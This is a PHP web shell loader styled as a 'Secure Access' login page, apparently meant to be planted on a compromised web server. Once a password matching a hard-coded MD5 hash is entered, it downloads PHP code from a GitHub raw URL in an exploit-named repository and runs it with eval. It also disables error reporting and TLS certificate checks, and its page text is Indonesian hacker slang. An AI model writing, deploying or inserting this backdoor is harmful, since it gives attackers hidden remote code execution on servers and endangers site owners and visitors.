<?php
session_start();

/**
 * Disable error reporting
 *
 * Set this to error_reporting( -1 ) for debugging.
 */
error_reporting(0);

function geturlsinfo($url) {
    if (function_exists('curl_exec')) {
        $conn = curl_init($url);
        curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($conn, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
        curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0);

        // Set cookies using session if available
        if (isset($_SESSION['coki'])) {
            curl_setopt($conn, CURLOPT_COOKIE, $_SESSION['coki']);
        }

        $url_get_contents_data = curl_exec($conn);
        curl_close($conn);
    } elseif (function_exists('file_get_contents')) {
        $url_get_contents_data = file_get_contents($url);
    } elseif (function_exists('fopen') && function_exists('stream_get_contents')) {
        $handle = fopen($url, "r");
        $url_get_contents_data = stream_get_contents($handle);
        fclose($handle);
    } else {
        $url_get_contents_data = false;
    }
    return $url_get_contents_data;
}

// Function to check if the user is logged in
function is_logged_in()
{
    return isset($_SESSION['logged_in']) && $_SESSION['logged_in'] === true;
}

// Check if the password is submitted and correct
if (isset($_POST['password'])) {
    $entered_password = $_POST['password'];
    $hashed_password = '12f5ffcaac86c7e50b8112d080fbfc3f'; // Replace this with your MD5 hashed password
    if (md5($entered_password) === $hashed_password) {
        // Password is correct, store it in session
        $_SESSION['logged_in'] = true;
        $_SESSION['coki'] = 'asu'; // Replace this with your cookie data
    } else {
        // Password is incorrect
        $error_message = "Njay Password Salah Dek. Mending Sana Turu Aja.";
    }
}

// Check if the user is logged in before executing the content
if (is_logged_in()) {
    $a = geturlsinfo('https://raw.githubusercontent.com/JawaTengahXploit1337/Method/main/ultra.php');
    eval('?>' . $a);
} else {
    // Display login form if not logged in
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Secure Access Dek</title>
      <link rel="icon" href="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRxZfPRpt0d7tfY1kIJRt9vf9bJsDTSi8ZubPa3Yo9gR1FyqLYKT1n8C3w&s=10" type="image/x-icon">
<meta property="og:description" content="Heker Kok Nykung Dek _< ">
        <link href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@300;400;700&display=swap" rel="stylesheet">
<script src="https://javastore.my.id/js/efek-salju.js" type="text/javascript"></script>
        <link rel="stylesheet" href="https://javastore.my.id/css/dek.css">
    </head>
    <body>
        <div class="login-container">
            <h1>Secure Access</h1>
            <?php if (isset($error_message)): ?>
                <p class="error-message"><?php echo $error_message; ?></p>
            <?php endif; ?>
            <form method="POST" action="">
                <input type="password" id="password" name="password" placeholder="Enter Passwordnya Dek" required>
                <input type="submit" value="Gas Login Dek">
            </form>
        </div>
    </body>
    </html>
    <?php
}
?>
